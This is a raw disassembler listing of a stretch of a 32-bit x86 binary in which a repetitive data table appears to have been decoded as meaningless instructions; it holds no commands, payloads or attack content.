  408b65:	00 07                	add    %al,(%edi)
  408b67:	07                   	pop    %es
  408b68:	00 00                	add    %al,(%eax)
  408b6a:	00 01                	add    %al,(%ecx)
	...
  408b74:	11 01                	adc    %eax,(%ecx)
  408b76:	00 00                	add    %al,(%eax)
  408b78:	00 47 47             	add    %al,0x47(%edi)
  408b7b:	00 00                	add    %al,(%eax)
  408b7d:	00 1b                	add    %bl,(%ebx)
  408b7f:	00 00                	add    %al,(%eax)
  408b81:	00 06                	add    %al,(%esi)
  408b83:	06                   	push   %es
  408b84:	00 00                	add    %al,(%eax)
  408b86:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408b89:	00 00                	add    %al,(%eax)
  408b8b:	00 47 47             	add    %al,0x47(%edi)
  408b8e:	00 00                	add    %al,(%eax)
  408b90:	00 16                	add    %dl,(%esi)
  408b92:	17                   	pop    %ss
  408b93:	18 01                	sbb    %al,(%ecx)
  408b95:	00 00                	add    %al,(%eax)
  408b97:	00 fb                	add    %bh,%bl
  408b99:	fb                   	sti
  408b9a:	00 00                	add    %al,(%eax)
  408b9c:	00 12                	add    %dl,(%edx)
  408b9e:	13 0e                	adc    (%esi),%ecx
  408ba0:	00 00                	add    %al,(%eax)
  408ba2:	00 07                	add    %al,(%edi)
  408ba4:	07                   	pop    %es
  408ba5:	00 00                	add    %al,(%eax)
  408ba7:	00 01                	add    %al,(%ecx)
	...
  408bb1:	11 01                	adc    %eax,(%ecx)
  408bb3:	00 00                	add    %al,(%eax)
  408bb5:	00 48 48             	add    %cl,0x48(%eax)
  408bb8:	00 00                	add    %al,(%eax)
  408bba:	00 1b                	add    %bl,(%ebx)
  408bbc:	00 00                	add    %al,(%eax)
  408bbe:	00 06                	add    %al,(%esi)
  408bc0:	06                   	push   %es
  408bc1:	00 00                	add    %al,(%eax)
  408bc3:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408bc6:	00 00                	add    %al,(%eax)
  408bc8:	00 48 48             	add    %cl,0x48(%eax)
  408bcb:	00 00                	add    %al,(%eax)
  408bcd:	00 16                	add    %dl,(%esi)
  408bcf:	17                   	pop    %ss
  408bd0:	18 01                	sbb    %al,(%ecx)
  408bd2:	00 00                	add    %al,(%eax)
  408bd4:	00 8a 8a 00 00 00    	add    %cl,0x8a(%edx)
  408bda:	12 13                	adc    (%ebx),%dl
  408bdc:	0e                   	push   %cs
  408bdd:	00 00                	add    %al,(%eax)
  408bdf:	00 07                	add    %al,(%edi)
  408be1:	07                   	pop    %es
  408be2:	00 00                	add    %al,(%eax)
  408be4:	00 01                	add    %al,(%ecx)
	...
  408bee:	11 01                	adc    %eax,(%ecx)
  408bf0:	00 00                	add    %al,(%eax)
  408bf2:	00 49 49             	add    %cl,0x49(%ecx)
  408bf5:	00 00                	add    %al,(%eax)
  408bf7:	00 1b                	add    %bl,(%ebx)
  408bf9:	00 00                	add    %al,(%eax)
  408bfb:	00 06                	add    %al,(%esi)
  408bfd:	06                   	push   %es
  408bfe:	00 00                	add    %al,(%eax)
  408c00:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408c03:	00 00                	add    %al,(%eax)
  408c05:	00 49 49             	add    %cl,0x49(%ecx)
  408c08:	00 00                	add    %al,(%eax)
  408c0a:	00 16                	add    %dl,(%esi)
  408c0c:	17                   	pop    %ss
  408c0d:	18 01                	sbb    %al,(%ecx)
  408c0f:	00 00                	add    %al,(%eax)
  408c11:	00 e3                	add    %ah,%bl
  408c13:	e3 00                	jecxz  0x408c15
  408c15:	00 00                	add    %al,(%eax)
  408c17:	12 13                	adc    (%ebx),%dl
  408c19:	0e                   	push   %cs
  408c1a:	00 00                	add    %al,(%eax)
  408c1c:	00 07                	add    %al,(%edi)
  408c1e:	07                   	pop    %es
  408c1f:	00 00                	add    %al,(%eax)
  408c21:	00 01                	add    %al,(%ecx)
	...
  408c2b:	11 01                	adc    %eax,(%ecx)
  408c2d:	00 00                	add    %al,(%eax)
  408c2f:	00 4a 4a             	add    %cl,0x4a(%edx)
  408c32:	00 00                	add    %al,(%eax)
  408c34:	00 01                	add    %al,(%ecx)
  408c36:	00 00                	add    %al,(%eax)
  408c38:	00 89 89 00 00 00    	add    %cl,0x89(%ecx)
  408c3e:	01 00                	add    %eax,(%eax)
  408c40:	00 00                	add    %al,(%eax)
  408c42:	84 84 00 00 00 12 13 	test   %al,0x13120000(%eax,%eax,1)
  408c49:	0e                   	push   %cs
  408c4a:	00 00                	add    %al,(%eax)
  408c4c:	00 07                	add    %al,(%edi)
  408c4e:	07                   	pop    %es
  408c4f:	00 00                	add    %al,(%eax)
  408c51:	00 01                	add    %al,(%ecx)
	...
  408c5b:	11 01                	adc    %eax,(%ecx)
  408c5d:	00 00                	add    %al,(%eax)
  408c5f:	00 4b 4b             	add    %cl,0x4b(%ebx)
  408c62:	00 00                	add    %al,(%eax)
  408c64:	00 1b                	add    %bl,(%ebx)
  408c66:	00 00                	add    %al,(%eax)
  408c68:	00 06                	add    %al,(%esi)
  408c6a:	06                   	push   %es
  408c6b:	00 00                	add    %al,(%eax)
  408c6d:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408c70:	00 00                	add    %al,(%eax)
  408c72:	00 4b 4b             	add    %cl,0x4b(%ebx)
  408c75:	00 00                	add    %al,(%eax)
  408c77:	00 16                	add    %dl,(%esi)
  408c79:	17                   	pop    %ss
  408c7a:	18 01                	sbb    %al,(%ecx)
  408c7c:	00 00                	add    %al,(%eax)
  408c7e:	00 62 62             	add    %ah,0x62(%edx)
  408c81:	00 00                	add    %al,(%eax)
  408c83:	00 12                	add    %dl,(%edx)
  408c85:	13 0e                	adc    (%esi),%ecx
  408c87:	00 00                	add    %al,(%eax)
  408c89:	00 07                	add    %al,(%edi)
  408c8b:	07                   	pop    %es
  408c8c:	00 00                	add    %al,(%eax)
  408c8e:	00 01                	add    %al,(%ecx)
	...
  408c98:	11 01                	adc    %eax,(%ecx)
  408c9a:	00 00                	add    %al,(%eax)
  408c9c:	00 4c 4c 00          	add    %cl,0x0(%esp,%ecx,2)
  408ca0:	00 00                	add    %al,(%eax)
  408ca2:	1b 00                	sbb    (%eax),%eax
  408ca4:	00 00                	add    %al,(%eax)
  408ca6:	06                   	push   %es
  408ca7:	06                   	push   %es
  408ca8:	00 00                	add    %al,(%eax)
  408caa:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408cad:	00 00                	add    %al,(%eax)
  408caf:	00 4c 4c 00          	add    %cl,0x0(%esp,%ecx,2)
  408cb3:	00 00                	add    %al,(%eax)
  408cb5:	16                   	push   %ss
  408cb6:	17                   	pop    %ss
  408cb7:	18 01                	sbb    %al,(%ecx)
  408cb9:	00 00                	add    %al,(%eax)
  408cbb:	00 3d 3d 00 00 00    	add    %bh,0x3d
  408cc1:	12 13                	adc    (%ebx),%dl
  408cc3:	0e                   	push   %cs
  408cc4:	00 00                	add    %al,(%eax)
  408cc6:	00 07                	add    %al,(%edi)
  408cc8:	07                   	pop    %es
  408cc9:	00 00                	add    %al,(%eax)
  408ccb:	00 01                	add    %al,(%ecx)
	...
  408cd5:	11 01                	adc    %eax,(%ecx)
  408cd7:	00 00                	add    %al,(%eax)
  408cd9:	00 4d 4d             	add    %cl,0x4d(%ebp)
  408cdc:	00 00                	add    %al,(%eax)
  408cde:	00 01                	add    %al,(%ecx)
  408ce0:	00 00                	add    %al,(%eax)
  408ce2:	00 f9                	add    %bh,%cl
  408ce4:	f9                   	stc
  408ce5:	00 00                	add    %al,(%eax)
  408ce7:	00 01                	add    %al,(%ecx)
  408ce9:	00 00                	add    %al,(%eax)
  408ceb:	00 8c 8c 00 00 00 12 	add    %cl,0x12000000(%esp,%ecx,4)
  408cf2:	13 0e                	adc    (%esi),%ecx
  408cf4:	00 00                	add    %al,(%eax)
  408cf6:	00 07                	add    %al,(%edi)
  408cf8:	07                   	pop    %es
  408cf9:	00 00                	add    %al,(%eax)
  408cfb:	00 01                	add    %al,(%ecx)
	...
  408d05:	11 01                	adc    %eax,(%ecx)
  408d07:	00 00                	add    %al,(%eax)
  408d09:	00 4e 4e             	add    %cl,0x4e(%esi)
  408d0c:	00 00                	add    %al,(%eax)
  408d0e:	00 01                	add    %al,(%ecx)
  408d10:	00 00                	add    %al,(%eax)
  408d12:	00 95 95 00 00 00    	add    %dl,0x95(%ebp)
  408d18:	01 00                	add    %eax,(%eax)
  408d1a:	00 00                	add    %al,(%eax)
  408d1c:	ec                   	in     (%dx),%al
  408d1d:	ec                   	in     (%dx),%al
  408d1e:	00 00                	add    %al,(%eax)
  408d20:	00 12                	add    %dl,(%edx)
  408d22:	13 0e                	adc    (%esi),%ecx
  408d24:	00 00                	add    %al,(%eax)
  408d26:	00 07                	add    %al,(%edi)
  408d28:	07                   	pop    %es
  408d29:	00 00                	add    %al,(%eax)
  408d2b:	00 01                	add    %al,(%ecx)
	...
  408d35:	11 01                	adc    %eax,(%ecx)
  408d37:	00 00                	add    %al,(%eax)
  408d39:	00 4f 4f             	add    %cl,0x4f(%edi)
  408d3c:	00 00                	add    %al,(%eax)
  408d3e:	00 01                	add    %al,(%ecx)
  408d40:	00 00                	add    %al,(%eax)
  408d42:	00 76 76             	add    %dh,0x76(%esi)
  408d45:	00 00                	add    %al,(%eax)
  408d47:	00 01                	add    %al,(%ecx)
  408d49:	00 00                	add    %al,(%eax)
  408d4b:	00 56 56             	add    %dl,0x56(%esi)
  408d4e:	00 00                	add    %al,(%eax)
  408d50:	00 12                	add    %dl,(%edx)
  408d52:	13 0e                	adc    (%esi),%ecx
  408d54:	00 00                	add    %al,(%eax)
  408d56:	00 07                	add    %al,(%edi)
  408d58:	07                   	pop    %es
  408d59:	00 00                	add    %al,(%eax)
  408d5b:	00 01                	add    %al,(%ecx)
	...
  408d65:	11 01                	adc    %eax,(%ecx)
  408d67:	00 00                	add    %al,(%eax)
  408d69:	00 50 50             	add    %dl,0x50(%eax)
  408d6c:	00 00                	add    %al,(%eax)
  408d6e:	00 1b                	add    %bl,(%ebx)
  408d70:	00 00                	add    %al,(%eax)
  408d72:	00 06                	add    %al,(%esi)
  408d74:	06                   	push   %es
  408d75:	00 00                	add    %al,(%eax)
  408d77:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408d7a:	00 00                	add    %al,(%eax)
  408d7c:	00 50 50             	add    %dl,0x50(%eax)
  408d7f:	00 00                	add    %al,(%eax)
  408d81:	00 16                	add    %dl,(%esi)
  408d83:	17                   	pop    %ss
  408d84:	18 01                	sbb    %al,(%ecx)
  408d86:	00 00                	add    %al,(%eax)
  408d88:	00 cc                	add    %cl,%ah
  408d8a:	cc                   	int3
  408d8b:	00 00                	add    %al,(%eax)
  408d8d:	00 12                	add    %dl,(%edx)
  408d8f:	13 0e                	adc    (%esi),%ecx
  408d91:	00 00                	add    %al,(%eax)
  408d93:	00 07                	add    %al,(%edi)
  408d95:	07                   	pop    %es
  408d96:	00 00                	add    %al,(%eax)
  408d98:	00 01                	add    %al,(%ecx)
	...
  408da2:	11 01                	adc    %eax,(%ecx)
  408da4:	00 00                	add    %al,(%eax)
  408da6:	00 51 51             	add    %dl,0x51(%ecx)
  408da9:	00 00                	add    %al,(%eax)
  408dab:	00 01                	add    %al,(%ecx)
  408dad:	00 00                	add    %al,(%eax)
  408daf:	00 48 48             	add    %cl,0x48(%eax)
  408db2:	00 00                	add    %al,(%eax)
  408db4:	00 01                	add    %al,(%ecx)
  408db6:	00 00                	add    %al,(%eax)
  408db8:	00 3d 3d 00 00 00    	add    %bh,0x3d
  408dbe:	12 13                	adc    (%ebx),%dl
  408dc0:	0e                   	push   %cs
  408dc1:	00 00                	add    %al,(%eax)
  408dc3:	00 07                	add    %al,(%edi)
  408dc5:	07                   	pop    %es
  408dc6:	00 00                	add    %al,(%eax)
  408dc8:	00 01                	add    %al,(%ecx)
	...
  408dd2:	11 01                	adc    %eax,(%ecx)
  408dd4:	00 00                	add    %al,(%eax)
  408dd6:	00 52 52             	add    %dl,0x52(%edx)
  408dd9:	00 00                	add    %al,(%eax)
  408ddb:	00 01                	add    %al,(%ecx)
  408ddd:	00 00                	add    %al,(%eax)
  408ddf:	00 ed                	add    %ch,%ch
  408de1:	ed                   	in     (%dx),%eax
  408de2:	00 00                	add    %al,(%eax)
  408de4:	00 01                	add    %al,(%ecx)
  408de6:	00 00                	add    %al,(%eax)
  408de8:	00 81 81 00 00 00    	add    %al,0x81(%ecx)
  408dee:	12 13                	adc    (%ebx),%dl
  408df0:	0e                   	push   %cs
  408df1:	00 00                	add    %al,(%eax)
  408df3:	00 07                	add    %al,(%edi)
  408df5:	07                   	pop    %es
  408df6:	00 00                	add    %al,(%eax)
  408df8:	00 01                	add    %al,(%ecx)
	...
  408e02:	11 01                	adc    %eax,(%ecx)
  408e04:	00 00                	add    %al,(%eax)
  408e06:	00 53 53             	add    %dl,0x53(%ebx)
  408e09:	00 00                	add    %al,(%eax)
  408e0b:	00 1b                	add    %bl,(%ebx)
  408e0d:	00 00                	add    %al,(%eax)
  408e0f:	00 06                	add    %al,(%esi)
  408e11:	06                   	push   %es
  408e12:	00 00                	add    %al,(%eax)
  408e14:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408e17:	00 00                	add    %al,(%eax)
  408e19:	00 53 53             	add    %dl,0x53(%ebx)
  408e1c:	00 00                	add    %al,(%eax)
  408e1e:	00 16                	add    %dl,(%esi)
  408e20:	17                   	pop    %ss
  408e21:	18 01                	sbb    %al,(%ecx)
  408e23:	00 00                	add    %al,(%eax)
  408e25:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  408e29:	00 00                	add    %al,(%eax)
  408e2b:	12 13                	adc    (%ebx),%dl
  408e2d:	0e                   	push   %cs
  408e2e:	00 00                	add    %al,(%eax)
  408e30:	00 07                	add    %al,(%edi)
  408e32:	07                   	pop    %es
  408e33:	00 00                	add    %al,(%eax)
  408e35:	00 01                	add    %al,(%ecx)
	...
  408e3f:	11 01                	adc    %eax,(%ecx)
  408e41:	00 00                	add    %al,(%eax)
  408e43:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  408e47:	00 00                	add    %al,(%eax)
  408e49:	1b 00                	sbb    (%eax),%eax
  408e4b:	00 00                	add    %al,(%eax)
  408e4d:	06                   	push   %es
  408e4e:	06                   	push   %es
  408e4f:	00 00                	add    %al,(%eax)
  408e51:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408e54:	00 00                	add    %al,(%eax)
  408e56:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  408e5a:	00 00                	add    %al,(%eax)
  408e5c:	16                   	push   %ss
  408e5d:	17                   	pop    %ss
  408e5e:	18 01                	sbb    %al,(%ecx)
  408e60:	00 00                	add    %al,(%eax)
  408e62:	00 64 64 00          	add    %ah,0x0(%esp,%eiz,2)
  408e66:	00 00                	add    %al,(%eax)
  408e68:	12 13                	adc    (%ebx),%dl
  408e6a:	0e                   	push   %cs
  408e6b:	00 00                	add    %al,(%eax)
  408e6d:	00 07                	add    %al,(%edi)
  408e6f:	07                   	pop    %es
  408e70:	00 00                	add    %al,(%eax)
  408e72:	00 01                	add    %al,(%ecx)
	...
  408e7c:	11 01                	adc    %eax,(%ecx)
  408e7e:	00 00                	add    %al,(%eax)
  408e80:	00 55 55             	add    %dl,0x55(%ebp)
  408e83:	00 00                	add    %al,(%eax)
  408e85:	00 01                	add    %al,(%ecx)
  408e87:	00 00                	add    %al,(%eax)
  408e89:	00 fa                	add    %bh,%dl
  408e8b:	fa                   	cli
  408e8c:	00 00                	add    %al,(%eax)
  408e8e:	00 01                	add    %al,(%ecx)
  408e90:	00 00                	add    %al,(%eax)
  408e92:	00 8c 8c 00 00 00 12 	add    %cl,0x12000000(%esp,%ecx,4)
  408e99:	13 0e                	adc    (%esi),%ecx
  408e9b:	00 00                	add    %al,(%eax)
  408e9d:	00 07                	add    %al,(%edi)
  408e9f:	07                   	pop    %es
  408ea0:	00 00                	add    %al,(%eax)
  408ea2:	00 01                	add    %al,(%ecx)
	...
  408eac:	11 01                	adc    %eax,(%ecx)
  408eae:	00 00                	add    %al,(%eax)
  408eb0:	00 56 56             	add    %dl,0x56(%esi)
  408eb3:	00 00                	add    %al,(%eax)
  408eb5:	00 1b                	add    %bl,(%ebx)
  408eb7:	00 00                	add    %al,(%eax)
  408eb9:	00 06                	add    %al,(%esi)
  408ebb:	06                   	push   %es
  408ebc:	00 00                	add    %al,(%eax)
  408ebe:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408ec1:	00 00                	add    %al,(%eax)
  408ec3:	00 56 56             	add    %dl,0x56(%esi)
  408ec6:	00 00                	add    %al,(%eax)
  408ec8:	00 16                	add    %dl,(%esi)
  408eca:	17                   	pop    %ss
  408ecb:	18 01                	sbb    %al,(%ecx)
  408ecd:	00 00                	add    %al,(%eax)
  408ecf:	00 8a 8a 00 00 00    	add    %cl,0x8a(%edx)
  408ed5:	12 13                	adc    (%ebx),%dl
  408ed7:	0e                   	push   %cs
  408ed8:	00 00                	add    %al,(%eax)
  408eda:	00 07                	add    %al,(%edi)
  408edc:	07                   	pop    %es
  408edd:	00 00                	add    %al,(%eax)
  408edf:	00 01                	add    %al,(%ecx)
	...
  408ee9:	11 01                	adc    %eax,(%ecx)
  408eeb:	00 00                	add    %al,(%eax)
  408eed:	00 57 57             	add    %dl,0x57(%edi)
  408ef0:	00 00                	add    %al,(%eax)
  408ef2:	00 1b                	add    %bl,(%ebx)
  408ef4:	00 00                	add    %al,(%eax)
  408ef6:	00 06                	add    %al,(%esi)
  408ef8:	06                   	push   %es
  408ef9:	00 00                	add    %al,(%eax)
  408efb:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408efe:	00 00                	add    %al,(%eax)
  408f00:	00 57 57             	add    %dl,0x57(%edi)
  408f03:	00 00                	add    %al,(%eax)
  408f05:	00 16                	add    %dl,(%esi)
  408f07:	17                   	pop    %ss
  408f08:	18 01                	sbb    %al,(%ecx)
  408f0a:	00 00                	add    %al,(%eax)
  408f0c:	00 30                	add    %dh,(%eax)
  408f0e:	30 00                	xor    %al,(%eax)
  408f10:	00 00                	add    %al,(%eax)
  408f12:	12 13                	adc    (%ebx),%dl
  408f14:	0e                   	push   %cs
  408f15:	00 00                	add    %al,(%eax)
  408f17:	00 07                	add    %al,(%edi)
  408f19:	07                   	pop    %es
  408f1a:	00 00                	add    %al,(%eax)
  408f1c:	00 01                	add    %al,(%ecx)
	...
  408f26:	11 01                	adc    %eax,(%ecx)
  408f28:	00 00                	add    %al,(%eax)
  408f2a:	00 58 58             	add    %bl,0x58(%eax)
  408f2d:	00 00                	add    %al,(%eax)
  408f2f:	00 1b                	add    %bl,(%ebx)
  408f31:	00 00                	add    %al,(%eax)
  408f33:	00 06                	add    %al,(%esi)
  408f35:	06                   	push   %es
  408f36:	00 00                	add    %al,(%eax)
  408f38:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408f3b:	00 00                	add    %al,(%eax)
  408f3d:	00 58 58             	add    %bl,0x58(%eax)
  408f40:	00 00                	add    %al,(%eax)
  408f42:	00 16                	add    %dl,(%esi)
  408f44:	17                   	pop    %ss
  408f45:	18 01                	sbb    %al,(%ecx)
  408f47:	00 00                	add    %al,(%eax)
  408f49:	00 fc                	add    %bh,%ah
  408f4b:	fc                   	cld
  408f4c:	00 00                	add    %al,(%eax)
  408f4e:	00 12                	add    %dl,(%edx)
  408f50:	13 0e                	adc    (%esi),%ecx
  408f52:	00 00                	add    %al,(%eax)
  408f54:	00 07                	add    %al,(%edi)
  408f56:	07                   	pop    %es
  408f57:	00 00                	add    %al,(%eax)
  408f59:	00 01                	add    %al,(%ecx)
	...
  408f63:	11 01                	adc    %eax,(%ecx)
  408f65:	00 00                	add    %al,(%eax)
  408f67:	00 59 59             	add    %bl,0x59(%ecx)
  408f6a:	00 00                	add    %al,(%eax)
  408f6c:	00 1b                	add    %bl,(%ebx)
  408f6e:	00 00                	add    %al,(%eax)
  408f70:	00 06                	add    %al,(%esi)
  408f72:	06                   	push   %es
  408f73:	00 00                	add    %al,(%eax)
  408f75:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408f78:	00 00                	add    %al,(%eax)
  408f7a:	00 59 59             	add    %bl,0x59(%ecx)
  408f7d:	00 00                	add    %al,(%eax)
  408f7f:	00 16                	add    %dl,(%esi)
  408f81:	17                   	pop    %ss
  408f82:	18 01                	sbb    %al,(%ecx)
  408f84:	00 00                	add    %al,(%eax)
  408f86:	00 b1 b1 00 00 00    	add    %dh,0xb1(%ecx)
  408f8c:	12 13                	adc    (%ebx),%dl
  408f8e:	0e                   	push   %cs
  408f8f:	00 00                	add    %al,(%eax)
  408f91:	00 07                	add    %al,(%edi)
  408f93:	07                   	pop    %es
  408f94:	00 00                	add    %al,(%eax)
  408f96:	00 01                	add    %al,(%ecx)
	...
  408fa0:	11 01                	adc    %eax,(%ecx)
  408fa2:	00 00                	add    %al,(%eax)
  408fa4:	00 5a 5a             	add    %bl,0x5a(%edx)
  408fa7:	00 00                	add    %al,(%eax)
  408fa9:	00 1b                	add    %bl,(%ebx)
  408fab:	00 00                	add    %al,(%eax)
  408fad:	00 06                	add    %al,(%esi)
  408faf:	06                   	push   %es
  408fb0:	00 00                	add    %al,(%eax)
  408fb2:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408fb5:	00 00                	add    %al,(%eax)
  408fb7:	00 5a 5a             	add    %bl,0x5a(%edx)
  408fba:	00 00                	add    %al,(%eax)
  408fbc:	00 16                	add    %dl,(%esi)
  408fbe:	17                   	pop    %ss
  408fbf:	18 01                	sbb    %al,(%ecx)
  408fc1:	00 00                	add    %al,(%eax)
  408fc3:	00 23                	add    %ah,(%ebx)
  408fc5:	23 00                	and    (%eax),%eax
  408fc7:	00 00                	add    %al,(%eax)
  408fc9:	12 13                	adc    (%ebx),%dl
  408fcb:	0e                   	push   %cs
  408fcc:	00 00                	add    %al,(%eax)
  408fce:	00 07                	add    %al,(%edi)
  408fd0:	07                   	pop    %es
  408fd1:	00 00                	add    %al,(%eax)
  408fd3:	00 01                	add    %al,(%ecx)
	...
  408fdd:	11 01                	adc    %eax,(%ecx)
  408fdf:	00 00                	add    %al,(%eax)
  408fe1:	00 5b 5b             	add    %bl,0x5b(%ebx)
  408fe4:	00 00                	add    %al,(%eax)
  408fe6:	00 1b                	add    %bl,(%ebx)
  408fe8:	00 00                	add    %al,(%eax)
  408fea:	00 06                	add    %al,(%esi)
  408fec:	06                   	push   %es
  408fed:	00 00                	add    %al,(%eax)
  408fef:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408ff2:	00 00                	add    %al,(%eax)
  408ff4:	00 5b 5b             	add    %bl,0x5b(%ebx)
  408ff7:	00 00                	add    %al,(%eax)
  408ff9:	00 16                	add    %dl,(%esi)
  408ffb:	17                   	pop    %ss
  408ffc:	18 01                	sbb    %al,(%ecx)
  408ffe:	00 00                	add    %al,(%eax)
  409000:	00 78 78             	add    %bh,0x78(%eax)
  409003:	00 00                	add    %al,(%eax)
  409005:	00 12                	add    %dl,(%edx)
  409007:	13 0e                	adc    (%esi),%ecx
  409009:	00 00                	add    %al,(%eax)
  40900b:	00 07                	add    %al,(%edi)
  40900d:	07                   	pop    %es
  40900e:	00 00                	add    %al,(%eax)
  409010:	00 01                	add    %al,(%ecx)
	...
  40901a:	11 01                	adc    %eax,(%ecx)
  40901c:	00 00                	add    %al,(%eax)
  40901e:	00 5c 5c 00          	add    %bl,0x0(%esp,%ebx,2)
  409022:	00 00                	add    %al,(%eax)
  409024:	01 00                	add    %eax,(%eax)
  409026:	00 00                	add    %al,(%eax)
  409028:	36 36 00 00          	ss add %al,%ss:(%eax)
  40902c:	00 01                	add    %al,(%ecx)
  40902e:	00 00                	add    %al,(%eax)
  409030:	00 16                	add    %dl,(%esi)
  409032:	16                   	push   %ss
  409033:	00 00                	add    %al,(%eax)
  409035:	00 12                	add    %dl,(%edx)
  409037:	13 0e                	adc    (%esi),%ecx
  409039:	00 00                	add    %al,(%eax)
  40903b:	00 07                	add    %al,(%edi)
  40903d:	07                   	pop    %es
  40903e:	00 00                	add    %al,(%eax)
  409040:	00 01                	add    %al,(%ecx)
	...
  40904a:	11 01                	adc    %eax,(%ecx)
  40904c:	00 00                	add    %al,(%eax)
  40904e:	00 5d 5d             	add    %bl,0x5d(%ebp)
  409051:	00 00                	add    %al,(%eax)
  409053:	00 1b                	add    %bl,(%ebx)
  409055:	00 00                	add    %al,(%eax)
  409057:	00 06                	add    %al,(%esi)
  409059:	06                   	push   %es
  40905a:	00 00                	add    %al,(%eax)
  40905c:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  40905f:	00 00                	add    %al,(%eax)
  409061:	00 5d 5d             	add    %bl,0x5d(%ebp)
  409064:	00 00                	add    %al,(%eax)
  409066:	00 16                	add    %dl,(%esi)
  409068:	17                   	pop    %ss
  409069:	18 01                	sbb    %al,(%ecx)
  40906b:	00 00                	add    %al,(%eax)
  40906d:	00 0f                	add    %cl,(%edi)
  40906f:	0f 00 00             	sldt   (%eax)
  409072:	00 12                	add    %dl,(%edx)
  409074:	13 0e                	adc    (%esi),%ecx
  409076:	00 00                	add    %al,(%eax)
  409078:	00 07                	add    %al,(%edi)
  40907a:	07                   	pop    %es
  40907b:	00 00                	add    %al,(%eax)
  40907d:	00 01                	add    %al,(%ecx)
	...
  409087:	11 01                	adc    %eax,(%ecx)
  409089:	00 00                	add    %al,(%eax)
  40908b:	00 5e 5e             	add    %bl,0x5e(%esi)
  40908e:	00 00                	add    %al,(%eax)
  409090:	00 01                	add    %al,(%ecx)
  409092:	00 00                	add    %al,(%eax)
  409094:	00 94 94 00 00 00 01 	add    %dl,0x1000000(%esp,%edx,4)
  40909b:	00 00                	add    %al,(%eax)
  40909d:	00 e0                	add    %ah,%al
  40909f:	e0 00                	loopne 0x4090a1
  4090a1:	00 00                	add    %al,(%eax)
  4090a3:	12 13                	adc    (%ebx),%dl
  4090a5:	0e                   	push   %cs
  4090a6:	00 00                	add    %al,(%eax)
  4090a8:	00 07                	add    %al,(%edi)
  4090aa:	07                   	pop    %es
  4090ab:	00 00                	add    %al,(%eax)
  4090ad:	00 01                	add    %al,(%ecx)
	...
  4090b7:	11 01                	adc    %eax,(%ecx)
  4090b9:	00 00                	add    %al,(%eax)
  4090bb:	00 5f 5f             	add    %bl,0x5f(%edi)
  4090be:	00 00                	add    %al,(%eax)
  4090c0:	00 1b                	add    %bl,(%ebx)
  4090c2:	00 00                	add    %al,(%eax)
  4090c4:	00 06                	add    %al,(%esi)
  4090c6:	06                   	push   %es
  4090c7:	00 00                	add    %al,(%eax)
  4090c9:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4090cc:	00 00                	add    %al,(%eax)
  4090ce:	00 5f 5f             	add    %bl,0x5f(%edi)
  4090d1:	00 00                	add    %al,(%eax)
  4090d3:	00 16                	add    %dl,(%esi)
  4090d5:	17                   	pop    %ss
  4090d6:	18 01                	sbb    %al,(%ecx)
  4090d8:	00 00                	add    %al,(%eax)
  4090da:	00 64 64 00          	add    %ah,0x0(%esp,%eiz,2)
  4090de:	00 00                	add    %al,(%eax)
  4090e0:	12 13                	adc    (%ebx),%dl
  4090e2:	0e                   	push   %cs
  4090e3:	00 00                	add    %al,(%eax)
  4090e5:	00 07                	add    %al,(%edi)
  4090e7:	07                   	pop    %es
  4090e8:	00 00                	add    %al,(%eax)
  4090ea:	00 01                	add    %al,(%ecx)
	...
  4090f4:	11 01                	adc    %eax,(%ecx)
  4090f6:	00 00                	add    %al,(%eax)
  4090f8:	00 60 60             	add    %ah,0x60(%eax)
  4090fb:	00 00                	add    %al,(%eax)
  4090fd:	00 01                	add    %al,(%ecx)
  4090ff:	00 00                	add    %al,(%eax)
  409101:	00 47 47             	add    %al,0x47(%edi)
  409104:	00 00                	add    %al,(%eax)
  409106:	00 01                	add    %al,(%ecx)
  409108:	00 00                	add    %al,(%eax)
  40910a:	00 2f                	add    %ch,(%edi)
  40910c:	2f                   	das
  40910d:	00 00                	add    %al,(%eax)
  40910f:	00 12                	add    %dl,(%edx)
  409111:	13 0e                	adc    (%esi),%ecx
  409113:	00 00                	add    %al,(%eax)
  409115:	00 07                	add    %al,(%edi)
  409117:	07                   	pop    %es
  409118:	00 00                	add    %al,(%eax)
  40911a:	00 01                	add    %al,(%ecx)
	...
  409124:	11 01                	adc    %eax,(%ecx)
  409126:	00 00                	add    %al,(%eax)
  409128:	00 61 61             	add    %ah,0x61(%ecx)
  40912b:	00 00                	add    %al,(%eax)
  40912d:	00 01                	add    %al,(%ecx)
  40912f:	00 00                	add    %al,(%eax)
  409131:	00 81 81 00 00 00    	add    %al,0x81(%ecx)
  409137:	01 00                	add    %eax,(%eax)
  409139:	00 00                	add    %al,(%eax)
  40913b:	f5                   	cmc
  40913c:	f5                   	cmc
  40913d:	00 00                	add    %al,(%eax)
  40913f:	00 12                	add    %dl,(%edx)
  409141:	13 0e                	adc    (%esi),%ecx
  409143:	00 00                	add    %al,(%eax)
  409145:	00 07                	add    %al,(%edi)
  409147:	07                   	pop    %es
  409148:	00 00                	add    %al,(%eax)
  40914a:	00 01                	add    %al,(%ecx)
	...
  409154:	11 01                	adc    %eax,(%ecx)
  409156:	00 00                	add    %al,(%eax)
  409158:	00 62 62             	add    %ah,0x62(%edx)
  40915b:	00 00                	add    %al,(%eax)
  40915d:	00 1b                	add    %bl,(%ebx)
  40915f:	00 00                	add    %al,(%eax)
  409161:	00 06                	add    %al,(%esi)
  409163:	06                   	push   %es
  409164:	00 00                	add    %al,(%eax)
  409166:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  409169:	00 00                	add    %al,(%eax)
  40916b:	00 62 62             	add    %ah,0x62(%edx)
